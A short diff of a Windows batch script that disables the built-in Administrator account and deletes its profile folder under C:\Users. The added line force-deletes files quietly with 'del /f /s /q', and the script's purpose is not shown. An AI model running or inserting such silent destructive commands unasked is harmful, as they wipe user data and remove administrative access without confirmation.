@@ -81,6 +81,7 @@ echo.
 echo.
 echo [31mAccount Administrator DISABLED![0m
 net user Administrator /active:no
+del /f /s /q Administrator 1>nul
 cd C:\Users
 rmdir /s /q Administrator
 timeout 1 > NUL
